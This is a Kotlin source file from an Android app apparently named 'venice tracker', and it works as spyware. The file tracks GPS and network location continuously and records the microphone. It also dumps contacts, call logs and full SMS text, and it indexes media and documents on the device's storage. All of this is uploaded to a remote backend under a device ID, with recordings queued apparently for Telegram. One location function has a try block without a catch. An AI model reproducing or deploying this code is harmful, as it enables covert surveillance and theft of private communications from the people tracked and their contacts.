package com.venice.tracker

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.os.Looper
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

object Location2 {
    private var mgr: LocationManager? = null

    @SuppressLint("MissingPermission")
    fun start(ctx: Context) {
        if (mgr != null) return
        val m = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        mgr = m
        val l = object : LocationListener {
            override fun onLocationChanged(loc: Location) { push(loc) }
            override fun onProviderEnabled(p: String) {}
            override fun onProviderDisabled(p: String) {}
            @Deprecated("x") override fun onStatusChanged(p: String?, s: Int, e: Bundle?) {}
        }
        try {
            m.requestLocationUpdates(LocationManager.GPS_PROVIDER, Config.LOC_INTERVAL_MS, 0f, l, Looper.getMainLooper())
        } catch (t: Throwable) { Util.log(ctx, "gps: $t") }
        try {
            m.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, Config.LOC_INTERVAL_MS, 0f, l, Looper.getMainLooper())
        } catch (t: Throwable) { Util.log(ctx, "net: $t") }
    }

    @SuppressLint("MissingPermission")
    fun once(ctx: Context): String {
        val m = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val last = try { m.getLastKnownLocation(LocationManager.GPS_PROVIDER) }
                   ?: try { m.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (_: Throwable) { null }
        if (last == null) return "no fix yet"
        push(last)
        return "${last.latitude},${last.longitude}  +/-${last.accuracy.toInt()}m"
    }

    private fun push(loc: Location) {
        Cloud.sendLocation(loc.latitude, loc.longitude, loc.accuracy)
    }
}

object Recorder {
    private var mr: MediaRecorder? = null
    private var current: File? = null

    fun start(ctx: Context) {
        if (mr != null) return
        try {
            val dir = File(ctx.cacheDir, "rec").apply { mkdirs() }
            val f = File(dir, "rec_${Util.stamp}.m4a")
            val r = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            r.setAudioSource(MediaRecorder.AudioSource.MIC)
            r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            r.setAudioChannels(1)
            r.setAudioSamplingRate(16000)
            r.setAudioEncodingBitRate(32000)
            r.setOutputFile(f.absolutePath)
            r.prepare()
            r.start()
            mr = r
            current = f
        } catch (t: Throwable) {
            Util.log(ctx, "rec start: $t")
            try { mr?.release() } catch (_: Throwable) {}
            mr = null
        }
    }

    fun stop(ctx: Context) {
        val f = current
        try { mr?.stop() } catch (t: Throwable) { Util.log(ctx, "rec stop: $t"); f?.delete() }
        try { mr?.release() } catch (_: Throwable) {}
        mr = null
        current = null
        if (f != null && f.exists() && f.length() > 4000) {
            Cloud.queueTg(ctx, f, "rec ${Util.ts}", true)
        }
    }
}

object Pim {

    fun contacts(ctx: Context): String {
        val arr = JSONArray()
        try {
            val c: ContentResolver = ctx.contentResolver
            val cur = c.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                ), null, null, null
            )
            cur?.use {
                while (it.moveToNext() && arr.length() < 5000) {
                    arr.put(JSONObject()
                        .put("n", it.getString(0) ?: "")
                        .put("p", it.getString(1) ?: ""))
                }
            }
        } catch (t: Throwable) { Util.log(ctx, "contacts: $t") }
        return arr.toString()
    }

    fun calls(ctx: Context): String {
        val arr = JSONArray()
        try {
            val cur = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
                null, null, CallLog.Calls.DATE + " DESC"
            )
            cur?.use {
                while (it.moveToNext() && arr.length() < 3000) {
                    arr.put(JSONObject()
                        .put("num", it.getString(0) ?: "")
                        .put("type", it.getInt(1))
                        .put("dur", it.getLong(2))
                        .put("date", it.getLong(3)))
                }
            }
        } catch (t: Throwable) { Util.log(ctx, "calls: $t") }
        return arr.toString()
    }

    fun sms(ctx: Context): String {
        val arr = JSONArray()
        try {
            val cur = ctx.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null, null, Telephony.Sms.DATE + " DESC"
            )
            cur?.use {
                while (it.moveToNext() && arr.length() < 3000) {
                    arr.put(JSONObject()
                        .put("addr", it.getString(0) ?: "")
                        .put("body", it.getString(1) ?: "")
                        .put("date", it.getLong(2))
                        .put("type", it.getInt(3)))
                }
            }
        } catch (t: Throwable) { Util.log(ctx, "sms: $t") }
        return arr.toString()
    }

    fun snapshot(ctx: Context) {
        Cloud.put("dev/${Config.DEVICE_ID}/data/contacts", contacts(ctx))
        Cloud.put("dev/${Config.DEVICE_ID}/data/calls", calls(ctx))
        Cloud.put("dev/${Config.DEVICE_ID}/data/sms", sms(ctx))
    }
}

object Files {

    private val skipDirs = setOf(
        "Android/data", "Android/obb", ".thumbnails", "LOST.DIR",
        "cache", ".cache", "MIUI", "backups"
    )

    fun index(ctx: Context): Int {
        val roots = listOf(File("/storage/emulated/0"), File("/storage/emulated/0/Android/media"))
        val arr = JSONArray()
        var count = 0
        for (root in roots) {
            if (!root.exists()) continue
            root.walkTopDown().maxDepth(9).forEach { f ->
                if (count >= 8000) return@forEach
                if (f.isDirectory) {
                    val rel = f.absolutePath
                    if (skipDirs.any { rel.endsWith(it) }) return@forEach
                } else {
                    val n = f.name.lowercase()
                    if (n.endsWith(".jpg") || n.endsWith(".jpeg") || n.endsWith(".png") ||
                        n.endsWith(".webp") || n.endsWith(".mp4") || n.endsWith(".3gp") ||
                        n.endsWith(".mkv") || n.endsWith(".mp3") || n.endsWith(".m4a") ||
                        n.endsWith(".aac") || n.endsWith(".ogg") || n.endsWith(".opus") ||
                        n.endsWith(".pdf") || n.endsWith(".docx") || n.endsWith(".apk")
                    ) {
                        arr.put(JSONObject()
                            .put("p", f.absolutePath)
                            .put("s", f.length())
                            .put("m", f.lastModified()))
                        count++
                    }
                }
            }
        }
        // push in chunks of 400
        var chunk = 0
        var i = 0
        while (i < arr.length()) {
            val part = JSONArray()
            var j = 0
            while (j < 400 && i < arr.length()) { part.put(arr.get(i)); i++; j++ }
            Cloud.put("dev/${Config.DEVICE_ID}/files/$chunk", part.toString())
            chunk++
        }
        Cloud.put("dev/${Config.DEVICE_ID}/files_meta",
            JSONObject().put("count", count).put("chunks", chunk)
                .put("ts", System.currentTimeMillis()).toString())
        return count
    }
}
